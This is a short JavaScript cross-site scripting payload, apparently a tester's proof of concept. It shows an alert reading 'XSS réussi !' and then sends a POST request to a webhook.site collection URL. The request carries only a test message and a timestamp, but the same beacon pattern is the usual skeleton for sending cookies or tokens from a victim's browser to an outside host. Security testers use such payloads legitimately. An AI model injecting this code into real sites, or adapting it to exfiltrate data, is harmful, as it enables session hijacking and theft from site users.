alert("XSS réussi !");

fetch('https://webhook.site/#!/view/b8b92b0d-c75a-466c-b909-d87bc1dca42c', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        message: 'Test message from the XSS payload',
        timestamp: new Date().toISOString()
    })
})
.then(response => response.json())
.then(data => console.log('Data sent:', data))
.catch(error => console.error('Error:', error));
